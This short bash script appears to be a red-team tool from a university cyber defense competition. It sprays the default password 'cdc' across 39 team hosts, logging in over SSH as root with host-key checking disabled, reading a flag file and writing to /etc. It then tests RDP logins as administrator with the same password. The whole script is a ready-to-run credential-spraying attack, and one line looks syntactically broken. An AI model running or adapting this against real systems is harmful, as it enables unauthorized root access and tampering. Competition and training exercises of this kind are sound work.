#!/bin/bash
for i in {1..39}; do
	 sshpass -p 'cdc' ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@www.team$i.isucdc.com  echo SUCCESS ON TEAM $i \; cat /root/flag.txt \; echo `cat flags/team$` > /etc/flag.flag &

done

#these don't go to background, gives you time to submit the flags you got. 
for i in {1..39}; do
	if [ `$(xfreerdp --ignore-certificate --authonly -u administrator -p cdc timecard.team$i.isucdc.com >> /dev/null 2> /dev/null); echo $?` -eq 0 ]
	then
		echo $i RDP success
	fi
done
